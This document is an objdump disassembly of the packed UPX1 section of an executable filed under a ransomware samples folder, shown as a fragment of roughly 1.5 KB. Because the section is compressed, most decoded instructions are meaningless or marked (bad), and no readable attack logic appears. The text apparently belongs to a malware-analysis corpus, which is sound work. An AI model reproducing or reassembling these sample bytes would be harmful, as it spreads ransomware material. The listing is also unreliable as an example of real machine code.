
malware_samples/ransomware/a921508ae0a3b0dc7b061038f87ceab835e19a1fe1cbd9b64380984618dd7827.exe:     file format pei-x86-64


Disassembly of section UPX1:

000000014000d000 <UPX1>:
   14000d000:	34 2e                	xor    $0x2e,%al
   14000d002:	32 32                	xor    (%rdx),%dh
   14000d004:	00 55 50             	add    %dl,0x50(%rbp)
   14000d007:	58                   	pop    %rax
   14000d008:	21 0d 24 08 0a 59    	and    %ecx,0x590a0824(%rip)        # 0x1990ad832
   14000d00e:	8b 1f                	mov    (%rdi),%ebx
   14000d010:	6c                   	insb   (%dx),(%rdi)
   14000d011:	f9                   	stc
   14000d012:	58                   	pop    %rax
   14000d013:	6b 45 a5 d6          	imul   $0xffffffd6,-0x5b(%rbp),%eax
   14000d017:	00 00                	add    %al,(%rax)
   14000d019:	8f                   	(bad)
   14000d01a:	25 00 00 00 62       	and    $0x62000000,%eax
   14000d01f:	00 00                	add    %al,(%rax)
   14000d021:	49 02 00             	rex.WB add (%r8),%al
   14000d024:	ad                   	lods   (%rsi),%eax
   14000d025:	fb                   	sti
   14000d026:	bf 29 ff c3 66       	mov    $0x66c3ff29,%edi
   14000d02b:	66 2e 0f 1f 84 00 0e 	cs nopw 0x4800400e(%rax,%rax,1)
   14000d032:	40 00 48 
   14000d035:	83 ec 28             	sub    $0x28,%esp
   14000d038:	48 8b 05 15 54 1c 39 	mov    0x391c5415(%rip),%rax        # 0x1791d2454
   14000d03f:	76 de                	jbe    0x14000d01f
   14000d041:	7d 31                	jge    0x14000d074
   14000d043:	c9                   	leave
   14000d044:	c7 00 01 2c 1c 16    	movl   $0x161c2c01,(%rax)
   14000d04a:	19 19                	sbb    %ebx,(%rcx)
   14000d04c:	f6 ff                	idiv   %bh
   14000d04e:	db 01                	fildl  (%rcx)
   14000d050:	8c 53 0c             	mov    %ss,0xc(%rbx)
   14000d053:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   14000d058:	75 0f                	jne    0x14000d069
   14000d05a:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000d05e:	48 01 d0             	add    %rdx,%rax
   14000d061:	18 bf fd 79 db 50    	sbb    %bh,0x50db79fd(%rdi)
   14000d067:	45                   	rex.RB
   14000d068:	26 74 66             	es je  0x14000d0d1
   14000d06b:	38 bf 89 0d b9 7f    	cmp    %bh,0x7fb90d89(%rdi)
   14000d071:	0a 8b 00 85 c0 74    	or     0x74c08500(%rbx),%cl
   14000d077:	43 df f6             	rex.XB fcomip %st(6),%st
   14000d07a:	d9 de                	(bad)
   14000d07c:	b9 02 68 e8 08       	mov    $0x8e86802,%ecx
   14000d081:	28 04 27             	sub    %al,(%rdi,%riz,1)
   14000d084:	7c 42                	jl     0x14000d0c8
   14000d086:	15 6d 96 8b 12       	adc    $0x128b966d,%eax
   14000d08b:	be 93 3c dd 89       	mov    $0x89dd3c93,%esi
   14000d090:	10 1f                	adc    %bl,(%rdi)
   14000d092:	8c 3d 17 ac 82 dd    	mov    %?,-0x227d53e9(%rip)        # 0x11d837caf
   14000d098:	52                   	push   %rdx
   14000d099:	c3                   	ret
   14000d09a:	7e c1                	jle    0x14000d05d
   14000d09c:	df 1e                	fistps (%rsi)
   14000d09e:	83 38 01             	cmpl   $0x1,(%rax)
   14000d0a1:	74 50                	je     0x14000d0f3
   14000d0a3:	31 c0                	xor    %eax,%eax
   14000d0a5:	32 c4                	xor    %ah,%al
   14000d0a7:	28 c3                	sub    %al,%bl
   14000d0a9:	90                   	nop
   14000d0aa:	b9 01 85 eb 77       	mov    $0x77eb8501,%ecx
   14000d0af:	6d                   	insl   (%dx),(%rdi)
   14000d0b0:	7b 83                	jnp    0x14000d035
   14000d0b2:	bb 5f 0f b7 50       	mov    $0x50b70f5f,%ebx
   14000d0b7:	18 fe                	sbb    %bh,%dh
   14000d0b9:	fa                   	cli
   14000d0ba:	0b 44 45 0d          	or     0xd(%rbp,%rax,2),%eax
   14000d0be:	02 75 88             	add    -0x78(%rbp),%dh
   14000d0c1:	82                   	(bad)
   14000d0c2:	fb                   	sti
   14000d0c3:	bb c1 83 b8 9b       	mov    $0x9bb883c1,%ebx
   14000d0c8:	0e                   	(bad)
   14000d0c9:	0f 86 d8 56 8b 90    	jbe    0xd08c27a7
   14000d0cf:	f8                   	clc
   14000d0d0:	18 92 f7 83 cd fd    	sbb    %dl,-0x2327c09(%rdx)
   14000d0d6:	85 d2                	test   %edx,%edx
   14000d0d8:	0f 95 c1             	setne  %cl
   14000d0db:	e9 23 68 80 00       	jmp    0x140813903
   14000d0e0:	75 0d                	jne    0x14000d0ef
   14000d0e2:	11 54 93 fd          	adc    %edx,-0x3(%rbx,%rdx,4)
   14000d0e6:	f6 b5 ed 1f 1c b7    	divb   -0x48e3e013(%rbp)
   14000d0ec:	32 44 d8 78          	xor    0x78(%rax,%rbx,8),%al
   14000d0f0:	74 75                	je     0x14000d167
   14000d0f2:	44 8b 80 e8 78 38 4c 	mov    0x4c3878e8(%rax),%r8d
   14000d0f9:	f0 77 45             	lock ja 0x14000d141
   14000d0fc:	74 79                	je     0x14000d177
   14000d0fe:	66 90                	xchg   %ax,%ax
   14000d100:	3e 38 7e bf          	ds cmp %bh,-0x41(%rsi)
   14000d104:	3f                   	(bad)
   14000d105:	38 2e                	cmp    %ch,(%rsi)
   14000d107:	e5 b2                	in     $0xb2,%eax
   14000d109:	4c 8d 05 e6 7e 92 8d 	lea    -0x726d811a(%rip),%r8        # 0xcd934ff6
   14000d110:	15 e7 0d 0d e8       	adc    $0xe80d0de7,%eax
   14000d115:	3b cd                	cmp    %ebp,%ecx
   14000d117:	5d                   	pop    %rbp
   14000d118:	70 d0                	jo     0x14000d0ea
   14000d11a:	89 05 c0 1d 46 81    	mov    %eax,-0x7eb9e240(%rip)        # 0xc146eee0
   14000d120:	88 5f 83             	mov    %bl,-0x7d(%rdi)
   14000d123:	77 5b                	ja     0x14000d180
   14000d125:	08 30                	or     %dh,(%rax)
   14000d127:	05 af 21 89 44       	add    $0x448921af,%eax
   14000d12c:	24 20                	and    $0x20,%al
   14000d12e:	cd f4                	int    $0xf4
   14000d130:	86 c4                	xchg   %al,%ah
   14000d132:	38 dc                	cmp    %bl,%ah
   14000d134:	f7 ff                	idiv   %edi
   14000d136:	82                   	(bad)
   14000d137:	c3                   	ret
   14000d138:	0f 41 54 55 57       	cmovno 0x57(%rbp,%rdx,2),%edx
   14000d13d:	56                   	push   %rsi
   14000d13e:	53                   	push   %rbx
   14000d13f:	48 81 ec 90 18 b9 0d 	sub    $0xdb91890,%rsp
   14000d146:	e1 e5                	loope  0x14000d12d
   14000d148:	f6 66 0b             	mulb   0xb(%rsi)
   14000d14b:	1a 8d 54 54 5e d7    	sbb    -0x28a1abac(%rbp),%cl
   14000d151:	f3 48 ab             	rep stos %rax,(%rdi)
   14000d154:	8c 3d 7a 52 c1 ed    	mov    %?,-0x123ead86(%rip)        # 0x12dc223d4
   14000d15a:	76 41                	jbe    0x14000d19d
   14000d15c:	0f 0a                	(bad)
   14000d15e:	c9                   	leave
   14000d15f:	0f 85 7c 04 4c 65    	jne    0x1a54cd5e1
   14000d165:	26 04 25             	es add $0x25,%al
   14000d168:	30 85 60 fb 6f f7    	xor    %al,-0x89004a0(%rbp)
   14000d16e:	1d ae 36 0c 70       	sbb    $0x700c36ae,%eax
   14000d173:	08 31                	or     %dh,(%rcx)
   14000d175:	ed                   	in     (%dx),%eax
   14000d176:	4c 8b 25 91 91 18 eb 	mov    -0x14e76e6f(%rip),%r12        # 0x12b19630e
   14000d17d:	18 b7 ef db 87 bf    	sbb    %dh,-0x40782411(%rdi)
   14000d183:	39 c6                	cmp    %eax,%esi
   14000d185:	0f 84 5c 03 ec b9    	je     0xf9ecd4e7
   14000d18b:	e8 03 ca ff d4       	call   0x115009b93
   14000d190:	9e                   	sahf
   14000d191:	e8 f0 48 df 6e       	call   0x1aee01a86
   14000d196:	5b                   	pop    %rbx
   14000d197:	f0 0f b1 33          	lock cmpxchg %esi,(%rbx)
   14000d19b:	48 9a                	rex.W (bad)
   14000d19d:	75 e2                	jne    0x14000d181
   14000d19f:	66 35 83 74          	xor    $0x7483,%ax
   14000d1a3:	6c                   	insb   (%dx),(%rdi)
   14000d1a4:	8b 06                	mov    (%rsi),%eax
   14000d1a6:	83 f8 01             	cmp    $0x1,%eax
   14000d1a9:	17                   	(bad)
   14000d1aa:	ff                   	lcall  (bad)
   14000d1ab:	db 76 51             	(bad) 0x51(%rsi)
   14000d1ae:	04 03                	add    $0x3,%al
   14000d1b0:	14 85                	adc    $0x85,%al
   14000d1b2:	c0 13 7c             	rclb   $0x7c,(%rbx)
   14000d1b5:	c7 05 fe 7d 00 c1 dd 	movl   $0x69ef83dd,-0x3eff8202(%rip)        # 0x101014fbd
   14000d1bc:	83 ef 69 
   14000d1bf:	3d 18 85 ed 0f       	cmp    $0xfed8518,%eax
   14000d1c4:	39 b0 88 51 eb 00    	cmp    %esi,0xeb5188(%rax)
   14000d1ca:	c1 0f 0b             	rorl   $0xb,(%rdi)
   14000d1cd:	7e 92                	jle    0x14000d161
   14000d1cf:	74 0c                	je     0x14000d1dd
   14000d1d1:	45 5c                	rex.RB pop %r12
   14000d1d3:	ba 02 4d ff d0       	mov    $0xd0ff4d02,%edx
   14000d1d8:	ba dc ee ef c5       	mov    $0xc5efeedc,%edx
   14000d1dd:	1b a8 0d a8 b4 ff    	sbb    -0x4b57f3(%rax),%ebp
   14000d1e3:	15 fa 90 4b 15       	adc    $0x154b90fa,%eax
   14000d1e8:	fb                   	sti
   14000d1e9:	59                   	pop    %rcx
   14000d1ea:	af                   	scas   (%rdi),%eax
   14000d1eb:	43 c1 1b 36          	rex.XB rcrl $0x36,(%r11)
   14000d1ef:	94                   	xchg   %eax,%esp
   14000d1f0:	fd                   	std
   14000d1f1:	ff                   	(bad)
   14000d1f2:	ff 04 02             	incl   (%rdx,%rax,1)
   14000d1f5:	01 bc 08 19 2f 36 b8 	add    %edi,-0x47c9d0e7(%rax,%rcx,1)
   14000d1fc:	17                   	(bad)
   14000d1fd:	d8 05 50 35 5c 89    	fadds  -0x76a3cab0(%rip)        # 0xc95d0753
   14000d203:	7d 0f                	jge    0x14000d214
   14000d205:	27                   	(bad)
   14000d206:	71 88                	jno    0x14000d190
   14000d208:	3e b3 9c             	ds mov $0x9c,%bl
   14000d20b:	86 ab 75 1c eb 58    	xchg   %ch,0x58eb1c75(%rbx)
   14000d211:	27                   	(bad)
   14000d212:	84 d2                	test   %dl,%dl
   14000d214:	68 b8 a8 58 b0       	push   $0xffffffffb058a8b8
   14000d219:	83 e1 ba             	and    $0xffffffba,%ecx
   14000d21c:	27                   	(bad)
   14000d21d:	f1                   	int1
   14000d21e:	72 c0                	jb     0x14000d1e0
   14000d220:	fc                   	cld
   14000d221:	db ff                	(bad)
   14000d223:	2f                   	(bad)
   14000d224:	1c b6                	sbb    $0xb6,%al
   14000d226:	10 80 fa 20 7e e6    	adc    %al,-0x1981df06(%rax)
   14000d22c:	41 89 c8             	mov    %ecx,%r8d
   14000d22f:	41 83 f0 01          	xor    $0x1,%r8d
   14000d233:	16                   	(bad)
   14000d234:	22 41 0f             	and    0xf(%rcx),%al
   14000d237:	44 c8 eb e4 66       	rex.R enter $0xe4eb,$0x66
   14000d23c:	cf                   	iret
   14000d23d:	fd                   	std
   14000d23e:	e3 5d                	jrcxz  0x14000d29d
   14000d240:	7f 5e                	jg     0x14000d2a0
   14000d242:	15 2f b6 50 01       	adc    $0x150b62f,%eax
   14000d247:	5b                   	pop    %rbx
   14000d248:	1e                   	(bad)
   14000d249:	05 17 0d e7 75       	add    $0x75e70d17,%eax
   14000d24e:	5d                   	pop    %rbp
   14000d24f:	ef                   	out    %eax,(%dx)
   14000d250:	d0 18                	rcrb   $1,(%rax)
   14000d252:	92                   	xchg   %eax,%edx
   14000d253:	07                   	(bad)
   14000d254:	9e                   	sahf
   14000d255:	74 6d                	je     0x14000d2c4
   14000d257:	87 15 ef 16 b8 0a    	xchg   %edx,0xab816ef(%rip)        # 0x14ab8e94c
   14000d25d:	9c                   	pushf
   14000d25e:	f6 24 5c             	mulb   (%rsp,%rbx,2)
   14000d261:	01 ab 03 dc 3a f2    	add    %ebp,-0xdc523fd(%rbx)
   14000d267:	f1                   	int1
   14000d268:	ff                   	lcall  (bad)
   14000d269:	dd 83 2c de 1d 24    	fldl   0x241dde2c(%rbx)
   14000d26f:	47 8d 63 01          	rex.RXB lea 0x1(%r11),%r12d
   14000d273:	4d 63 e4             	movslq %r12d,%r12
   14000d276:	49 c1 e4 03          	shl    $0x3,%r12
   14000d27a:	4c 89 e1             	mov    %r12,%rcx
   14000d27d:	c3                   	ret
   14000d27e:	b7 bb                	mov    $0xbb,%bh
   14000d280:	e8 d9 64 0e 02       	call   0x1420f375e
   14000d285:	32 88 c5 85 db 0f    	xor    0xfdb85c5(%rax),%cl
   14000d28b:	8e 0e                	mov    (%rsi),%cs
   14000d28d:	77 45                	ja     0x14000d2d4
   14000d28f:	83 e3 9a             	and    $0xffffff9a,%ebx
   14000d292:	49 10 ec             	rex.WB adc %bpl,%r12b
   14000d295:	db 96 8b 0c 1f 43    	fistl  0x431f0c8b(%rsi)
   14000d29b:	17                   	(bad)
   14000d29c:	7f 5b                	jg     0x14000d2f9
   14000d29e:	41 9c                	rex.B pushf
   14000d2a0:	c6                   	(bad)
   14000d2a1:	70 e0                	jo     0x14000d283
   14000d2a3:	89 f1                	mov    %esi,%ecx
   14000d2a5:	5b                   	pop    %rbx
   14000d2a6:	49 89 f0             	mov    %rsi,%r8
   14000d2a9:	dc 1d ef 16 b4 07    	fcompl 0x7b416ef(%rip)        # 0x147b4e99e
   14000d2af:	fc                   	cld
   14000d2b0:	14 1f                	adc    $0x1f,%al
   14000d2b2:	10 c1                	adc    %al,%cl
   14000d2b4:	0e                   	(bad)
   14000d2b5:	c3                   	ret
   14000d2b6:	08 2f                	or     %ch,(%rdi)
   14000d2b8:	6c                   	insb   (%dx),(%rdi)
   14000d2b9:	4c 39 e3             	cmp    %r12,%rbx
   14000d2bc:	83 bf 78 d3 75 ce 44 	cmpl   $0x44,-0x318a2c88(%rdi)
   14000d2c3:	eb 48                	jmp    0x14000d30d
   14000d2c5:	c7 03 47 89 2d ad    	movl   $0xad2d8947,(%rbx)
   14000d2cb:	7c f7                	jl     0x14000d2c4
   14000d2cd:	70 ed                	jo     0x14000d2bc
   14000d2cf:	b1 c3                	mov    $0xc3,%cl
   14000d2d1:	17                   	(bad)
   14000d2d2:	1d 51 50 a6 0c       	sbb    $0xca65051,%eax
   14000d2d7:	92                   	xchg   %eax,%edx
   14000d2d8:	24 59                	and    $0x59,%al
   14000d2da:	07                   	(bad)
   14000d2db:	7b d8                	jnp    0x14000d2b5
   14000d2dd:	86 9c 7c c7 fe 87 87 	xchg   %bl,-0x78780139(%rsp,%rdi,2)
   14000d2e4:	4b 8b af e0 da 14 5d 	rex.WXB mov 0x5d14dae0(%r15),%rbp
   14000d2eb:	2e 6c                	cs insb (%dx),(%rdi)
   14000d2ed:	14 56                	adc    $0x56,%al
   14000d2ef:	6a 0a                	push   $0xa
   14000d2f1:	85 c9                	test   %ecx,%ecx
   14000d2f3:	21 d2                	and    %edx,%edx
   14000d2f5:	71 e9                	jno    0x14000d2e0
   14000d2f7:	da a2 3c 54 1b d2    	fisubl -0x2de4abc4(%rdx)
   14000d2fd:	5c                   	pop    %rsp
   14000d2fe:	92                   	xchg   %eax,%edx
   14000d2ff:	c4                   	(bad)
   14000d300:	0a 4c 55 bf          	or     -0x41(%rbp,%rdx,2),%cl
   14000d304:	5b                   	pop    %rbx
   14000d305:	5e                   	pop    %rsi
   14000d306:	5f                   	pop    %rdi
   14000d307:	5d                   	pop    %rbp
   14000d308:	41 5c                	pop    %r12
   14000d30a:	b8 90 3e c6 60       	mov    $0x60c63e90,%eax
   14000d30f:	bc 8b 0c 8f 76       	mov    $0x768f0c8b,%esp
   14000d314:	03 04 3f             	add    (%rdi,%rdi,1),%eax
   14000d317:	f2 89 ce             	repnz mov %ecx,%esi
   14000d31a:	bd dd f4 83 54       	mov    $0x5483f4dd,%ebp
   14000d31f:	bb fc 02 06 b9       	mov    $0xb90602fc,%ebx
   14000d324:	1f                   	(bad)
   14000d325:	ad                   	lods   (%rsi),%eax
   14000d326:	14 b3                	adc    $0xb3,%al
   14000d328:	17                   	(bad)
   14000d329:	f7 a6 29 25 f2 7d    	mull   0x7df22529(%rsi)
   14000d32f:	56                   	push   %rsi
   14000d330:	a2 66 50 3b 24 ee d1 	movabs %al,0xc5b7d1ee243b5066
   14000d337:	b7 c5 
   14000d339:	c7 06 d9 85 ed 41    	movl   $0x41ed85d9,(%rsi)
   14000d33f:	2d 54 87 03 b8       	sub    $0xb8038754,%eax
   14000d344:	2b 0a                	sub    (%rdx),%ecx
   14000d346:	42 d1 12             	rex.X rcll $1,(%rdx)
   14000d349:	66 5f                	pop    %di
   14000d34b:	a6                   	cmpsb  (%rdi),(%rsi)
   14000d34c:	d1 f4                	shl    $1,%esp
   14000d34e:	cf                   	iret
   14000d34f:	8e 5e d0             	mov    -0x30(%rsi),%ds
   14000d352:	d9 67 10             	fldenv 0x10(%rdi)
   14000d355:	2c 01                	sub    $0x1,%al
   14000d357:	ae                   	scas   (%rdi),%al
   14000d358:	fe                   	(bad)
   14000d359:	6b 1c a8 b9          	imul   $0xffffffb9,(%rax,%rbp,4),%ebx
   14000d35d:	7b 00                	jnp    0x14000d35f
   14000d35f:	00 b3 47 95 08 35    	add    %dh,0x35089547(%rbx)
   14000d365:	0f 15 39             	unpckhps (%rcx),%xmm7
   14000d368:	c7                   	(bad)
   14000d369:	22 5a 37             	and    0x37(%rdx),%bl
   14000d36c:	54                   	push   %rsp
   14000d36d:	76 0c                	jbe    0x14000d37b
   14000d36f:	bc bd 24 ad 1a       	mov    $0x1aad24bd,%esp
   14000d374:	9a                   	(bad)
   14000d375:	c3                   	ret
   14000d376:	00 ef                	add    %ch,%bh
   14000d378:	0c 0d                	or     $0xd,%al
   14000d37a:	77 71                	ja     0x14000d3ed
   14000d37c:	86 27                	xchg   %ah,(%rdi)
   14000d37e:	44 90                	rex.R nop
   14000d380:	66 90                	xchg   %ax,%ax
   14000d382:	f5                   	cmc
   14000d383:	17                   	(bad)
   14000d384:	02 bc 3f 65 4f 07 30 	add    0x30074f65(%rdi,%rdi,1),%bh
   14000d38b:	01 7c 90 90          	add    %edi,-0x70(%rax,%rdx,4)
   14000d38f:	c8 37 04 58          	enter  $0x437,$0x58
   14000d393:	83 7f 45 3f          	cmpl   $0x3f,0x45(%rdi)
   14000d397:	00 ae 02 eb 12 97    	add    %ch,-0x68ed14fe(%rsi)
   14000d39d:	2c 10                	sub    $0x10,%al
   14000d39f:	cc                   	int3
   14000d3a0:	19 a9 f8 e0 d1 da    	sbb    %ebp,-0x252e1f08(%rcx)
   14000d3a6:	01 54 09 00          	add    %edx,0x0(%rcx,%rcx,1)
   14000d3aa:	7b 04                	jnp    0x14000d3b0
   14000d3ac:	ec                   	in     (%dx),%al
   14000d3ad:	57                   	push   %rdi
   14000d3ae:	f0 06                	lock (bad)
   14000d3b0:	f3 8f                	repz (bad)
   14000d3b2:	39 00                	cmp    %eax,(%rax)
   14000d3b4:	55                   	push   %rbp
   14000d3b5:	24 e5                	and    $0xe5,%al
   14000d3b7:	86 0f                	xchg   %cl,(%rdi)
   14000d3b9:	de 7e 9f             	fidivrs -0x61(%rsi)
   14000d3bc:	20 05 3f 7a 20 5d    	and    %al,0x5d207a3f(%rip)        # 0x19d214e01
   14000d3c2:	c3                   	ret
   14000d3c3:	25 40 b9 9f ba       	and    $0xba9fb940,%eax
   14000d3c8:	4f                   	rex.WRXB
   14000d3c9:	f0 db 7f eb          	lock fstpt -0x15(%rdi)
   14000d3cd:	00 30                	add    %dh,(%rax)
   14000d3cf:	10 49 b8             	adc    %cl,-0x48(%rcx)
   14000d3d2:	13 4d 41             	adc    0x41(%rbp),%ecx
   14000d3d5:	b9 10 11 16 cc       	mov    $0xcc161110,%ecx
   14000d3da:	48 c8 b1 06 b7       	rex.W enter $0x6b1,$0xb7
   14000d3df:	b9 29 5b 09 ac       	mov    $0xac095b29,%ecx
   14000d3e4:	1d 81 26 e4 81       	sbb    $0x81e42681,%eax
   14000d3e9:	4c a9 31 44 99 21    	rex.WR test $0x21994431,%rax
   14000d3ef:	0f 64 42 d7          	pcmpgtb -0x29(%rdx),%mm0
   14000d3f3:	32 47 79             	xor    0x79(%rdi),%al
   14000d3f6:	20 13                	and    %dl,(%rbx)
   14000d3f8:	32 bd f7 33 21 30    	xor    0x302133f7(%rbp),%bh
   14000d3fe:	05 91 09 45 ac       	add    $0xac450991,%eax
   14000d403:	40 1a b6 10 e4 5f df 	sbb    -0x20a01bf0(%rsi),%sil
   14000d40a:	0c 4d                	or     $0x4d,%al
   14000d40c:	10 ae 45 e0 6a c3    	adc    %ch,-0x3c951fbb(%rsi)
   14000d412:	c8 06 9c bc          	enter  $0x9c06,$0xbc
   14000d416:	be 8d c2 d0 f0       	mov    $0xf0d0c28d,%esi
   14000d41b:	a2 bb 83 fd 20 41 89 	movabs %al,0x1855894120fd83bb
   14000d422:	55 18 
   14000d424:	62 45 20 83 7d       	(bad)
   14000d429:	59                   	pop    %rcx
   14000d42a:	6b 5b 5c e0          	imul   $0xffffffe0,0x5c(%rbx),%ebx
   14000d42e:	78 07                	js     0x14000d437
   14000d430:	b8 3d eb 21 5c       	mov    $0x5c21eb3d,%eax
   14000d435:	4d 7a 8b             	rex.WRB jp 0x14000d3c3
   14000d438:	30 5b 86             	xor    %bl,-0x7a(%rbx)
   14000d43b:	5b                   	pop    %rbx
   14000d43c:	d3 78 2e             	sarl   %cl,0x2e(%rax)
   14000d43f:	c9                   	leave
   14000d440:	04 d0                	add    $0xd0,%al
   14000d442:	89 c2                	mov    %eax,%edx
   14000d444:	53                   	push   %rbx
   14000d445:	8c 17                	mov    %ss,(%rdi)
   14000d447:	8e 2f                	mov    (%rdi),%gs
   14000d449:	e4 01                	in     $0x1,%al
   14000d44b:	20 d0                	and    %dl,%al
   14000d44d:	8d 81 ec f6 ba d1    	lea    -0x2e450914(%rcx),%eax
   14000d453:	bb c0 33 8d 05       	mov    $0x58d33c0,%ebx
   14000d458:	1e                   	(bad)
   14000d459:	39 23                	cmp    %esp,(%rbx)
   14000d45b:	85 60 ff             	test   %esp,-0x1(%rax)
   14000d45e:	f8                   	clc
   14000d45f:	1a 91 91 91 91 40    	sbb    0x40919191(%rcx),%dl
   14000d465:	68 62 70 bc 97       	push   $0xffffffff97bc7062
   14000d46a:	91                   	xchg   %eax,%ecx
   14000d46b:	91                   	xchg   %eax,%ecx
   14000d46c:	84 78 a6             	test   %bh,-0x5a(%rax)
   14000d46f:	45 80 14 cb e5       	rex.RB adcb $0xe5,(%r11,%rcx,8)
   14000d474:	33 f2                	xor    %edx,%esi
   14000d476:	8c 88 f0 90 15 3a    	mov    %cs,0x3a1590f0(%rax)
   14000d47c:	8c 3c 23             	mov    %?,(%rbx,%riz,1)
   14000d47f:	cf                   	iret
   14000d480:	98                   	cwtl
   14000d481:	3a a0 57 a8 cf c8    	cmp    -0x373057a9(%rax),%ah
   14000d487:	33 f2                	xor    %edx,%esi
   14000d489:	7c b0                	jl     0x14000d43b
   14000d48b:	a1 b8 be f2 8c 3c 23 	movabs 0xdbc0233c8cf2beb8,%eax
   14000d492:	c0 db 
   14000d494:	c8 f8 cc dc          	enter  $0xccf8,$0xdc
   14000d498:	e5 33                	in     $0x33,%eax
   14000d49a:	d0 1d 3b d8 af 15    	rcrb   $1,0x15afd83b(%rip)        # 0x155b0acdb
   14000d4a0:	e0 e2                	loopne 0x14000d484
   14000d4a2:	44 3f                	rex.R (bad)
   14000d4a4:	f2 5f                	repnz pop %rdi
   14000d4a6:	e8 c7 45 fc 00       	call   0x140fd1a72
   14000d4ab:	39 08                	cmp    %ecx,(%rax)
   14000d4ad:	4c                   	rex.WR
   14000d4ae:	4d 7f db             	rex.WRB jg 0x14000d48c
   14000d4b1:	d0 53 74             	rclb   $1,0x74(%rbx)
   14000d4b4:	06                   	(bad)
   14000d4b5:	48 63 04 69          	movslq (%rcx,%rbp,2),%rax
   14000d4b9:	c0 39 8e             	sarb   $0x8e,(%rcx)
   14000d4bc:	e3 38                	jrcxz  0x14000d4f6
   14000d4be:	48                   	rex.W
   14000d4bf:	46 20 df             	rex.RX and %r11b,%dil
   14000d4c2:	d0 be e9 c1 f8 02    	sarb   $1,0x2f8c1e9(%rsi)
   14000d4c8:	fe c1                	inc    %cl
   14000d4ca:	f9                   	stc
   14000d4cb:	1f                   	(bad)
   14000d4cc:	29 c8                	sub    %ecx,%eax
   14000d4ce:	5a                   	pop    %rdx
   14000d4cf:	f8                   	clc
   14000d4d0:	60                   	(bad)
   14000d4d1:	f8                   	clc
   14000d4d2:	89 c8                	mov    %ecx,%eax
   14000d4d4:	c1 e0 0b             	shl    $0xb,%eax
   14000d4d7:	9a                   	(bad)
   14000d4d8:	19 fe                	sbb    %edi,%esi
   14000d4da:	03 01                	add    (%rcx),%eax
   14000d4dc:	c8 01 c0 29          	enter  $0xc001,$0x29
   14000d4e0:	c2 a6 20             	ret    $0x20a6
   14000d4e3:	26 48 62 8b 84 2b 42 	(bad)
   14000d4ea:	22 87 c5 1f 29 86    	and    -0x79d6e03b(%rdi),%al
   14000d4f0:	29 b9 da 53 1e c3    	sub    %edi,-0x3ce1ac26(%rcx)
   14000d4f6:	99                   	cltd
   14000d4f7:	b3 8c                	mov    $0x8c,%bl
   14000d4f9:	bb b6 d0 53 6c       	mov    $0x6c53d0b6,%ebx
   14000d4fe:	9a                   	(bad)
   14000d4ff:	6f                   	outsl  (%rsi),(%dx)
   14000d500:	d2 b5 81 4e 1b ea    	shlb   %cl,-0x15e4b17f(%rbp)
   14000d506:	fa                   	cli
   14000d507:	05 f6 b7 fe f8       	add    $0xf8feb7f6,%eax
   14000d50c:	5b                   	pop    %rbx
   14000d50d:	bc ca 69 ca 2c       	mov    $0x2cca69ca,%esp
   14000d512:	26 c6 c2 8d          	es mov $0x8d,%dl
   14000d516:	42 32 1f             	rex.X xor (%rdi),%bl
   14000d519:	16                   	(bad)
   14000d51a:	8b 01                	mov    (%rcx),%eax
   14000d51c:	4e 2f                	rex.WRX (bad)
   14000d51e:	e8 69 83 3c 01       	call   0x1413d588c
   14000d523:	81 7d fc ef 85 85 ea 	cmpl   $0xea8585ef,-0x4(%rbp)
   14000d52a:	f4                   	hlt
   14000d52b:	46 07                	rex.RX (bad)
   14000d52d:	b5 9c                	mov    $0x9c,%ch
   14000d52f:	e6 15                	out    %al,$0x15
   14000d531:	2e 23 7c 71 84       	cs and -0x7c(%rcx,%rsi,2),%edi
   14000d536:	c6                   	(bad)
   14000d537:	98                   	cwtl
   14000d538:	2b ac 24 d7 93 1c 2c 	sub    0x2c1c93d7(%rsp),%ebp
   14000d53f:	37                   	(bad)
   14000d540:	df 2b                	fildll (%rbx)
   14000d542:	ba f0 09 6f cb       	mov    $0xcb6f09f0,%edx
   14000d547:	b0 91                	mov    $0x91,%al
   14000d549:	fe c3                	inc    %bl
   14000d54b:	49 0e                	rex.WB (bad)
   14000d54d:	d4                   	(bad)
   14000d54e:	89 d8                	mov    %ebx,%eax
   14000d550:	99                   	cltd
   14000d551:	f7 e4                	mul    %esp
   14000d553:	c8 b0 82 f9          	enter  $0x82b0,$0xf9
   14000d557:	92                   	xchg   %eax,%edx
   14000d558:	ec                   	in     (%dx),%al
   14000d559:	3d 01 ef 8b e1       	cmp    $0xe18bef01,%eax
   14000d55e:	4b f7 0d 3a 09 8e 2f 	rex.WXB testq $0xffffffffc08941d7,0x2f8e093a(%rip)        # 0x16f8edea3
   14000d565:	d7 41 89 c0 
   14000d569:	0e                   	(bad)
   14000d56a:	f6 a1 a0 14 fc 98    	mulb   -0x6703eb60(%rcx)
   14000d570:	c1 50 67 66          	rcll   $0x66,0x67(%rax)
   14000d574:	00 51 0f             	add    %dl,0xf(%rcx)
   14000d577:	1f                   	(bad)
   14000d578:	0a 04 74             	or     (%rsp,%rsi,2),%al
   14000d57b:	9c                   	pushf
   14000d57c:	02 3a                	add    (%rdx),%bh
   14000d57e:	f8                   	clc
   14000d57f:	1f                   	(bad)
   14000d580:	32 d0                	xor    %al,%dl
   14000d582:	b3 b7                	mov    $0xb7,%bl
   14000d584:	cd 0d                	int    $0xd
   14000d586:	48 02 01             	rex.W add (%rcx),%al
   14000d589:	d0 89 ca 18 8d 5a    	rorb   $1,0x5a8d18ca(%rcx)
   14000d58f:	01 44 5e 8c          	add    %eax,-0x74(%rsi,%rbx,2)
   14000d593:	41 6d                	rex.B insl (%dx),(%rdi)
   14000d595:	58                   	pop    %rax
   14000d596:	41 fb                	rex.B sti
   14000d598:	20 e4                	and    %ah,%ah
   14000d59a:	bd 90 8d 4c 04       	mov    $0x44c8d90,%ebp
   14000d59f:	17                   	(bad)
   14000d5a0:	c1 e0 97             	shl    $0x97,%eax
   14000d5a3:	42 59                	rex.X pop %rcx
   14000d5a5:	dc 6b 27             	fsubrl 0x27(%rbx)
   14000d5a8:	76 11                	jbe    0x14000d5bb
   14000d5aa:	97                   	xchg   %eax,%edi
   14000d5ab:	23 3d d8 44 e8 e4    	and    -0x1b17bb28(%rip),%edi        # 0x124e91a89
   14000d5b1:	06                   	(bad)
   14000d5b2:	df 70 b2             	fbstp  -0x4e(%rax)
   14000d5b5:	0e                   	(bad)
   14000d5b6:	22 8b 52 fe 48 44    	and    0x4448fe52(%rbx),%cl
   14000d5bc:	24 50                	and    $0x50,%al
   14000d5be:	20 00                	and    %al,(%rax)
